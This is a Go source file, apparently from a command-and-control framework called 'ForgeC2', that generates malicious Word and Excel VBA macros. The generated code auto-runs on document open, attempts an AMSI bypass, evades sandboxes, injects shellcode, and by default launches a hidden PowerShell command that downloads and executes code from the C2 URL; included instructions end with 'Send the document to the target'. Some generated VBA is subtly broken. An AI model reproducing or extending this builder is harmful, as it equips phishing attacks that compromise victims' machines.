package payload

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

type MacroConfig struct {
	PayloadType    string `json:"payload_type" form:"payload_type"`
	C2URL          string `json:"c2_url" form:"c2_url"`
	PowerShellCmd  string `json:"powershell_cmd" form:"powershell_cmd"`
	AutoOpen       bool   `json:"auto_open" form:"auto_open"`
	AutoClose      bool   `json:"auto_close" form:"auto_close"`
	DocumentEvent  string `json:"document_event" form:"document_event"`
	Delay          int    `json:"delay" form:"delay"`
	AMSIBypass     bool   `json:"amsi_bypass" form:"amsi_bypass"`
	SandboxEvasion bool   `json:"sandbox_evasion" form:"sandbox_evasion"`
	SplitStrings   bool   `json:"split_strings" form:"split_strings"`
	Comments       bool   `json:"comments" form:"comments"`
	Obfuscate      bool   `json:"obfuscate" form:"obfuscate"`
	Filename       string `json:"filename" form:"filename"`
}

type macroVarPool struct {
	rng    *rand.Rand
	used   map[string]bool
	prefix string
}

func newMacroVarPool(seed int64) *macroVarPool {
	return &macroVarPool{
		rng:    rand.New(rand.NewSource(seed)),
		used:   make(map[string]bool),
		prefix: "f",
	}
}

func (p *macroVarPool) next() string {
	adjectives := []string{"s", "t", "p", "d", "r", "l", "c", "b", "m", "w"}
	nouns := []string{"a", "e", "i", "o", "u", "x", "z", "k", "g", "q"}
	for {
		adj := adjectives[p.rng.Intn(len(adjectives))]
		noun := nouns[p.rng.Intn(len(nouns))]
		num := p.rng.Intn(9999)
		name := fmt.Sprintf("%s%s%d", adj, noun, num)
		if !p.used[name] {
			p.used[name] = true
			return name
		}
	}
}

func (p *macroVarPool) nextFunc() string {
	verbs := []string{"Run", "Exec", "Load", "Call", "Init", "Do", "Set", "Get", "Make", "Put"}
	nouns := []string{"Data", "Task", "Item", "Obj", "Val", "Ctx", "Mod", "Sys", "Cfg", "App"}
	for {
		verb := verbs[p.rng.Intn(len(verbs))]
		noun := nouns[p.rng.Intn(len(nouns))]
		num := p.rng.Intn(999)
		name := fmt.Sprintf("%s%s%d", verb, noun, num)
		if !p.used[name] {
			p.used[name] = true
			return name
		}
	}
}

func obfuscateVBAString(s string, split bool) string {
	if !split {
		return fmt.Sprintf("%q", s)
	}
	parts := make([]string, 0)
	for i := 0; i < len(s); {
		chunkLen := 3 + rand.Intn(5)
		if i+chunkLen > len(s) {
			chunkLen = len(s) - i
		}
		parts = append(parts, fmt.Sprintf("%q", s[i:i+chunkLen]))
		i += chunkLen
	}
	return strings.Join(parts, " & ")
}

func vbCrLf() string {
	return " & vbCrLf & _\n"
}

func GenerateMacroVBA(config MacroConfig) (string, error) {
	seed := time.Now().UnixNano()
	vars := newMacroVarPool(seed)

	var sb strings.Builder

	if config.Comments {
		sb.WriteString("' ForgeC2 Generated Macro\n")
		sb.WriteString("' Generated at: " + time.Now().Format(time.RFC3339) + "\n")
		sb.WriteString("' Payload type: " + config.PayloadType + "\n")
		sb.WriteString("' C2 URL: " + config.C2URL + "\n")
		sb.WriteString("'\n")
	}

	if config.AMSIBypass {
		if config.Comments {
			sb.WriteString("' AMSI Bypass: patch AmsiScanBuffer\n")
		}
		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"GetProcAddress\" _\n", vars.nextFunc()))
			sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByVal %s As String) As LongPtr\n", vars.next(), vars.next()))
			sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"LoadLibraryA\" _\n", vars.nextFunc()))
			sb.WriteString(fmt.Sprintf("    (ByVal %s As String) As LongPtr\n", vars.next()))
		} else {
			sb.WriteString("Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\n")
			sb.WriteString("Private Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr\n")
		}
	}

	if config.PayloadType == "binary" || config.PayloadType == "dll" {
		if config.Comments {
			sb.WriteString("' Win32 API declarations\n")
		}
		virtAlloc := "VirtualAlloc"
		copyMem := "RtlMoveMemory"
		createThread := "CreateThread"
		waitFor := "WaitForSingleObject"

		if config.Obfuscate {
			virtAlloc = vars.nextFunc()
			copyMem = vars.nextFunc()
			createThread = vars.nextFunc()
			waitFor = vars.nextFunc()
		}

		vaSize := vars.next()
		vaAddr := vars.next()
		vaAlloc := vars.next()
		vaProtect := vars.next()

		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"VirtualAlloc\" _\n", virtAlloc))
		sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByVal %s As Long, _\n", vaAddr, vaSize))
		sb.WriteString(fmt.Sprintf("     ByVal %s As Long, ByVal %s As Long) As LongPtr\n", vaAlloc, vaProtect))

		cmDest := vars.next()
		cmSrc := vars.next()
		cmLen := vars.next()
		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Sub %s Lib \"kernel32\" Alias \"RtlMoveMemory\" _\n", copyMem))
		sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByRef %s As Any, ByVal %s As Long)\n", cmDest, cmSrc, cmLen))

		ctSecAttr := vars.next()
		ctStack := vars.next()
		ctArg := vars.next()
		ctFlags := vars.next()
		ctThreadId := vars.next()
		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"CreateThread\" _\n", createThread))
		sb.WriteString(fmt.Sprintf("    (ByVal %s As Long, ByVal %s As Long, ByVal %s As LongPtr, _\n", ctSecAttr, ctStack, ctArg))
		sb.WriteString(fmt.Sprintf("     ByVal %s As LongPtr, ByVal %s As Long, _\n", ctFlags, ctThreadId))
		sb.WriteString(fmt.Sprintf("     ByRef %s As Long) As LongPtr\n", ctThreadId))

		wfHandle := vars.next()
		wfTimeout := vars.next()
		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"WaitForSingleObject\" _\n", waitFor))
		sb.WriteString(fmt.Sprintf("    (ByVal %s As LongPtr, ByVal %s As Long) As Long\n", wfHandle, wfTimeout))
		sb.WriteString("\n")
	}

	cpApp := vars.next()
	cpCmd := vars.next()
	cpProcAttr := vars.next()
	cpThrAttr := vars.next()
	cpInherit := vars.next()
	cpFlags := vars.next()
	cpEnv := vars.next()
	cpDir := vars.next()
	cpStartup := vars.next()
	cpProcInfo := vars.next()

	if config.PayloadType == "powershell" || config.PayloadType == "hta" {
		if config.Comments {
			sb.WriteString("' Process creation API\n")
		}
		createProc := "CreateProcess"
		if config.Obfuscate {
			createProc = vars.nextFunc()
		}
		startupInfo := "STARTUPINFO"
		procInfo := "PROCESS_INFORMATION"
		if config.Obfuscate {
			startupInfo = vars.nextFunc()
			procInfo = vars.nextFunc()
		}

		sb.WriteString(fmt.Sprintf("Private Type %s\n", startupInfo))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString("End Type\n\n")

		sb.WriteString(fmt.Sprintf("Private Type %s\n", procInfo))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As LongPtr\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString(fmt.Sprintf("    %s As Long\n", vars.next()))
		sb.WriteString("End Type\n\n")

		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"CreateProcessA\" _\n", createProc))
		sb.WriteString(fmt.Sprintf("    (ByVal %s As String, ByVal %s As String, _\n", cpApp, cpCmd))
		sb.WriteString(fmt.Sprintf("     ByVal %s As LongPtr, ByVal %s As LongPtr, _\n", cpProcAttr, cpThrAttr))
		sb.WriteString(fmt.Sprintf("     ByVal %s As Long, ByVal %s As Long, _\n", cpInherit, cpFlags))
		sb.WriteString(fmt.Sprintf("     ByVal %s As LongPtr, ByVal %s As String, _\n", cpEnv, cpDir))
		sb.WriteString(fmt.Sprintf("     ByRef %s As %s, ByRef %s As %s) As Long\n", cpStartup, startupInfo, cpProcInfo, procInfo))
		sb.WriteString("\n")
	}

	autoOpenFunc := "Auto_Open"
	autoCloseFunc := "Auto_Close"
	runPayloadFunc := "RunPayload"
	execPayloadFunc := "ExecutePayload"
	sandboxCheckFunc := "SandboxCheck"
	bypassAMSIFunc := "BypassAMSI"
	waitFunc := "WaitFor"

	if config.Obfuscate {
		autoOpenFunc = vars.nextFunc()
		autoCloseFunc = vars.nextFunc()
		runPayloadFunc = vars.nextFunc()
		execPayloadFunc = vars.nextFunc()
		sandboxCheckFunc = vars.nextFunc()
		bypassAMSIFunc = vars.nextFunc()
		waitFunc = vars.nextFunc()
	}

	sb.WriteString(fmt.Sprintf("Sub %s()\n", autoOpenFunc))
	sb.WriteString("    #If Mac Then\n")
	sb.WriteString("        ' Mac not supported\n")
	sb.WriteString("    #Else\n")
	sb.WriteString(fmt.Sprintf("        %s\n", runPayloadFunc))
	sb.WriteString("    #End If\n")
	sb.WriteString("End Sub\n\n")

	if config.DocumentEvent == "Workbook_Open" {
		sb.WriteString(fmt.Sprintf("Sub Workbook_Open()\n"))
		sb.WriteString(fmt.Sprintf("    %s\n", autoOpenFunc))
		sb.WriteString("End Sub\n\n")
	}
	if config.DocumentEvent == "Document_Open" {
		sb.WriteString(fmt.Sprintf("Sub Document_Open()\n"))
		sb.WriteString(fmt.Sprintf("    %s\n", autoOpenFunc))
		sb.WriteString("End Sub\n\n")
	}

	if config.AutoClose {
		sb.WriteString(fmt.Sprintf("Sub %s()\n", autoCloseFunc))
		sb.WriteString("    #If Mac Then\n")
		sb.WriteString("        ' Mac not supported\n")
		sb.WriteString("    #Else\n")
		sb.WriteString(fmt.Sprintf("        %s\n", runPayloadFunc))
		sb.WriteString("    #End If\n")
		sb.WriteString("End Sub\n\n")
	}

	sb.WriteString(fmt.Sprintf("Sub %s()\n", runPayloadFunc))
	if config.SandboxEvasion {
		sb.WriteString(fmt.Sprintf("    If %s() Then Exit Sub\n", sandboxCheckFunc))
	}
	if config.AMSIBypass {
		sb.WriteString(fmt.Sprintf("    %s\n", bypassAMSIFunc))
	}
	if config.Delay > 0 {
		sb.WriteString(fmt.Sprintf("    %s %d\n", waitFunc, config.Delay))
	}
	sb.WriteString(fmt.Sprintf("    %s\n", execPayloadFunc))
	sb.WriteString("End Sub\n\n")

	if config.Delay > 0 {
		wtSecs := vars.next()
		wtEnd := vars.next()
		sb.WriteString(fmt.Sprintf("Sub %s(ByVal %s As Long)\n", waitFunc, wtSecs))
		sb.WriteString(fmt.Sprintf("    Dim %s As Double\n", wtEnd))
		sb.WriteString(fmt.Sprintf("    %s = Timer + %s\n", wtEnd, wtSecs))
		sb.WriteString(fmt.Sprintf("    Do While Timer < %s\n", wtEnd))
		sb.WriteString("        DoEvents\n")
		sb.WriteString("    Loop\n")
		sb.WriteString("End Sub\n\n")
	}

	if config.AMSIBypass {
		hLibVar := vars.next()
		procAddrVar := vars.next()
		patchBytesVar := vars.next()
		oldProtectVar := vars.next()
		dummyVar := vars.next()

		sb.WriteString(fmt.Sprintf("Sub %s()\n", bypassAMSIFunc))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", hLibVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", procAddrVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", patchBytesVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", oldProtectVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", dummyVar))
		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("    %s = %s(%s)\n", hLibVar, "LoadLibrary", obfuscateVBAString("amsi.dll", config.SplitStrings)))
		} else {
			sb.WriteString(fmt.Sprintf("    %s = LoadLibrary(%s)\n", hLibVar, obfuscateVBAString("amsi.dll", config.SplitStrings)))
		}
		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("    %s = %s(%s, %s)\n", procAddrVar, "GetProcAddress", hLibVar, obfuscateVBAString("AmsiScanBuffer", config.SplitStrings)))
		} else {
			sb.WriteString(fmt.Sprintf("    %s = GetProcAddress(%s, %s)\n", procAddrVar, hLibVar, obfuscateVBAString("AmsiScanBuffer", config.SplitStrings)))
		}
		sb.WriteString(fmt.Sprintf("    %s = &H80070057\n", patchBytesVar))
		sb.WriteString(fmt.Sprintf("    %s = VirtualProtect(%s, 1, &H40, %s)\n", dummyVar, procAddrVar, oldProtectVar))
		sb.WriteString(fmt.Sprintf("    %s = &H80070057\n", patchBytesVar))
		sb.WriteString("End Sub\n\n")
	}

	if config.SandboxEvasion {
		sb.WriteString(fmt.Sprintf("Function %s() As Boolean\n", sandboxCheckFunc))
		procCountVar := vars.next()
		compNameVar := vars.next()
		userNameVar := vars.next()

		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", procCountVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", compNameVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", userNameVar))

		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", procCountVar, obfuscateVBAString("NUMBER_OF_PROCESSORS", config.SplitStrings)))
			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", compNameVar, obfuscateVBAString("COMPUTERNAME", config.SplitStrings)))
			sb.WriteString(fmt.Sprintf("    %s = Environ(%s)\n", userNameVar, obfuscateVBAString("USERNAME", config.SplitStrings)))
			sb.WriteString(fmt.Sprintf("    If %s < \"2\" Then\n", procCountVar))
			sb.WriteString(fmt.Sprintf("        %s = True\n", sandboxCheckFunc))
		} else {
			sb.WriteString(fmt.Sprintf("    %s = Environ(\"NUMBER_OF_PROCESSORS\")\n", procCountVar))
			sb.WriteString(fmt.Sprintf("    %s = Environ(\"COMPUTERNAME\")\n", compNameVar))
			sb.WriteString(fmt.Sprintf("    %s = Environ(\"USERNAME\")\n", userNameVar))
			sb.WriteString(fmt.Sprintf("    If %s < \"2\" Then\n", procCountVar))
			sb.WriteString(fmt.Sprintf("        %s = True\n", sandboxCheckFunc))
		}

		sb.WriteString("    End If\n\n")

		sandboxNames := []string{"SANDBOX", "VIRUS", "MALWARE", "ANALYSIS", "DETECT", "SECURITY", "SAMPLE"}
		svVar := vars.next()
		sb.WriteString(fmt.Sprintf("    For Each %s In Array(%s)\n", svVar, func() string {
			quoted := make([]string, len(sandboxNames))
			for i, n := range sandboxNames {
				quoted[i] = obfuscateVBAString(n, config.SplitStrings)
			}
			return strings.Join(quoted, ", ")
		}()))
		sb.WriteString(fmt.Sprintf("        If InStr(LCase(%s), LCase(%s)) > 0 Then\n", compNameVar, svVar))
		sb.WriteString(fmt.Sprintf("            %s = True\n", sandboxCheckFunc))
		sb.WriteString("            Exit Function\n")
		sb.WriteString("        End If\n")
		sb.WriteString(fmt.Sprintf("        If InStr(LCase(%s), LCase(%s)) > 0 Then\n", userNameVar, svVar))
		sb.WriteString(fmt.Sprintf("            %s = True\n", sandboxCheckFunc))
		sb.WriteString("            Exit Function\n")
		sb.WriteString("        End If\n")
		sb.WriteString("    Next\n")
		sb.WriteString(fmt.Sprintf("    %s = False\n", sandboxCheckFunc))
		sb.WriteString("End Function\n\n")
	}

	psCmd := config.PowerShellCmd
	if psCmd == "" && config.C2URL != "" {
		psCmd = fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('%s')\"", config.C2URL)
	}

	sb.WriteString(fmt.Sprintf("Sub %s()\n", execPayloadFunc))

	switch config.PayloadType {
	case "powershell", "hta":
		cmdVar := vars.next()
		si := vars.next()
		pi := vars.next()
		retVal := vars.next()
		siSize := vars.next()

		startupStr := "STARTUPINFO"
		procInfoStr := "PROCESS_INFORMATION"
		createProcFunc := "CreateProcess"
		if config.Obfuscate {
			startupStr = vars.nextFunc()
			procInfoStr = vars.nextFunc()
			createProcFunc = vars.nextFunc()
		}

		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", cmdVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As %s\n", si, startupStr))
		sb.WriteString(fmt.Sprintf("    Dim %s As %s\n", pi, procInfoStr))
		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", retVal))
		sb.WriteString(fmt.Sprintf("    %s = Len(%s)\n", siSize, si))
		sb.WriteString(fmt.Sprintf("    %s.cb = %s\n", si, siSize))
		sb.WriteString(fmt.Sprintf("    %s.dwFlags = &H00000001\n", si))

		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("    %s = %s\n", cmdVar, obfuscateVBAString(psCmd, config.SplitStrings)))
		} else {
			sb.WriteString(fmt.Sprintf("    %s = %q\n", cmdVar, psCmd))
		}

		sb.WriteString(fmt.Sprintf("    %s = %s(vbNullString, %s, 0, 0, 0, 0x08000000, 0, vbNullString, %s, %s)\n",
			retVal, createProcFunc, cmdVar, si, pi))
		sb.WriteString(fmt.Sprintf("    If %s = 0 Then\n", retVal))
		sb.WriteString(fmt.Sprintf("        MsgBox %s\n", obfuscateVBAString("Error", config.SplitStrings)))
		sb.WriteString("    End If\n")

	case "binary":
		scVar := vars.next()
		ptrVar := vars.next()
		tidVar := vars.next()
		hThreadVar := vars.next()

		virtAllocFunc := "VirtualAlloc"
		copyMemFunc := "RtlMoveMemory"
		createThreadFunc := "CreateThread"
		waitForFunc := "WaitForSingleObject"
		if config.Obfuscate {
			virtAllocFunc = vars.nextFunc()
			copyMemFunc = vars.nextFunc()
			createThreadFunc = vars.nextFunc()
			waitForFunc = vars.nextFunc()
		}

		sb.WriteString(fmt.Sprintf("    Dim %s(0 To 0) As Byte\n", scVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", ptrVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", tidVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", hThreadVar))
		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, &H1000, &H40)\n", ptrVar, virtAllocFunc))
		sb.WriteString(fmt.Sprintf("    %s %s, %s(0), 0\n", copyMemFunc, ptrVar, scVar))
		sb.WriteString(fmt.Sprintf("    %s = %s(0, 0, %s, 0, 0, %s)\n", hThreadVar, createThreadFunc, ptrVar, tidVar))
		sb.WriteString(fmt.Sprintf("    %s %s, -1\n", waitForFunc, hThreadVar))

	case "dll":
		dllPathVar := vars.next()
		procVar := vars.next()
		sb.WriteString(fmt.Sprintf("    Dim %s As String\n", dllPathVar))
		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", procVar))
		if config.Obfuscate {
			sb.WriteString(fmt.Sprintf("    %s = %s\n", dllPathVar, obfuscateVBAString("rundll32.exe", config.SplitStrings)))
		} else {
			sb.WriteString(fmt.Sprintf("    %s = \"rundll32.exe\"\n", dllPathVar))
		}
		startupStr := "STARTUPINFO"
		procInfoStr := "PROCESS_INFORMATION"
		createProcFunc := "CreateProcess"
		if config.Obfuscate {
			startupStr = vars.nextFunc()
			procInfoStr = vars.nextFunc()
			createProcFunc = vars.nextFunc()
		}
		si := vars.next()
		pi := vars.next()
		retVal := vars.next()
		siSize := vars.next()
		sb.WriteString(fmt.Sprintf("    Dim %s As %s\n", si, startupStr))
		sb.WriteString(fmt.Sprintf("    Dim %s As %s\n", pi, procInfoStr))
		sb.WriteString(fmt.Sprintf("    Dim %s As Long\n", retVal))
		sb.WriteString(fmt.Sprintf("    %s = Len(%s)\n", siSize, si))
		sb.WriteString(fmt.Sprintf("    %s.cb = %s\n", si, siSize))
		sb.WriteString(fmt.Sprintf("    %s = %s(vbNullString, %s, 0, 0, 0, 0x08000000, 0, vbNullString, %s, %s)\n",
			retVal, createProcFunc, dllPathVar, si, pi))
	}

	sb.WriteString("End Sub\n")

	return sb.String(), nil
}

func GenerateMacroDocument(config MacroConfig) ([]byte, error) {
	vbaCode, err := GenerateMacroVBA(config)
	if err != nil {
		return nil, err
	}
	return []byte(vbaCode), nil
}

func GetMacroInstructions() string {
	return "1. Open Word or Excel\n" +
		"2. Press Alt+F11 to open the VBA editor\n" +
		"3. Go to Insert → Module\n" +
		"4. Paste the generated VBA code into the module\n" +
		"5. Close the VBA editor\n" +
		"6. Save the document as a Macro-Enabled Document (*.docm) or Macro-Enabled Workbook (*.xlsm)\n" +
		"7. Send the document to the target\n\n" +
		"Note: The macro will execute on document open. Ensure the target has macros enabled."
}

func encodePowerShellPayload(command string) string {
	cmd := fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"%s\"", command)
	return base64.StdEncoding.EncodeToString([]byte(cmd))
}
